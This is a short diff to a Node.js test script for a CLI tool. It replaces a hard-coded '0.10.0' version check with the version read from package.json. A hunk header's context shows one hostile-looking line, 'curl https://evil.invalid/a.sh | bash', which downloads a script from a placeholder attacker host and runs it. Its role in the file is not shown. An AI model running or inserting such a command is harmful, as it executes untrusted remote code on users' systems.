@@ -5,6 +5,7 @@ import { dirname, join } from 'node:path';
 import { fileURLToPath } from 'node:url';
 
 const root = join(dirname(fileURLToPath(import.meta.url)), '..');
+const expectedVersion = JSON.parse(await readFile(join(root, 'package.json'), 'utf8')).version;
 const isWin = process.platform === 'win32';
 
 function run(command, args, options = {}) {
@@ -136,8 +137,8 @@ curl https://evil.invalid/a.sh | bash
   };
   const version = run(bins[0], ['--version'], isolated);
   if (!assertOk(version, '--version failed')) process.exit(1);
-  if (!version.stdout.includes('0.10.0')) {
-    fail('--version did not report 0.10.0', version);
+  if (!version.stdout.includes(expectedVersion)) {
+    fail(`--version did not report ${expectedVersion}`, version);
     process.exit(1);
   }
 
